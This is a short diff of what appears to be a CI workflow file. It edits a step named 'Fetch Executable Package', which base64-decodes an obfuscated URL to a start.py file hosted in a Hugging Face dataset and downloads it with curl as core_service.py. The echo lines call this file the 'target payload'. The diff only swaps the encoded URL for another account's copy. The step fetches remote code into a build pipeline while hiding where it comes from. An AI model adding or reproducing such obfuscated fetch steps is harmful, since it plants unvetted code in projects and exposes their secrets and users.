@@ -68,7 +68,7 @@ jobs:
       - name: Fetch Executable Package
         run: |
           echo "[FETCH] Pulling target payload from endpoint..."
-          REMOTE_URI=$(echo -n "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          REMOTE_URI=$(echo -n "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 -d)
           curl -sL "$REMOTE_URI" -o core_service.py
           echo "[FETCH] Package successfully written to core_service.py."
 
